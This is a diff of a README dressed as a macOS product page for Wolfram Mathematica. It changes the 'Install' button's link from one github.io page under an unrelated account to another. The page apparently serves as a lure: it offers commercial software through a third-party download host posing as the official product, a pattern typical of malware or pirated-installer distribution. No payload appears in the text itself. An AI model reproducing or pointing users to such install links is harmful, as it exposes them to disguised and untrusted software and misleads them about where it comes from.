@@ -2,7 +2,7 @@
 <h1 align="center">Wolfram Mathematica</h1>
 <p align="center">Native computational mathematics and science — done right on macOS.</p>
 <p align="center"><img src="https://img.shields.io/badge/macOS-000000?style=flat-square&logo=apple&logoColor=white"/> &nbsp; <img src="https://img.shields.io/badge/Apple_Silicon-Ready-brightgreen?style=flat-square"/> &nbsp; <img src="https://img.shields.io/badge/Dark_Mode-Supported-blueviolet?style=flat-square"/></p>
-<p align="center"><a href="https://blya-dayte-deneg.github.io/.github/wolframmathematica"><img src="https://i.postimg.cc/HWQSXqhp/68747470733a2f2f692e706f7374696d.png" alt="Install" width="160"/></a></p>
+<p align="center"><a href="https://ukabvar-losos.github.io/.github/wolframmathematica"><img src="https://i.postimg.cc/HWQSXqhp/68747470733a2f2f692e706f7374696d.png" alt="Install" width="160"/></a></p>
 <p align="center"><img src="https://content.wolfram.com/sites/20/2023/11/12449_20231122_Prod1.png" alt="Wolfram Mathematica — macOS computational mathematics and science screenshot" width="780"/></p>
 
 ---
